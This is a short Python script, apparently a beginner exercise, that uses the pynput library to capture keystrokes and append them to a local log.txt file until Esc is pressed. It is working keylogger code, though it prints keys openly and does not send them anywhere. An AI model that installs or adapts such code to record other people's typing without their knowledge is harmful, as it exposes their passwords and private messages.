import pynput

count = 0
keys = []

from pynput.keyboard import Key, Listener

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} is pressed".format(key))

    if count >= 10: 
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k .find("space") > 0:
                # if space is pressed then we goto new line
                f.write("\n")
            elif k.find("Key") == -1:
                # if it doesn't find the string you're looking for then returns -1 val
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False 

# functions are called when key is presssed and when key is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()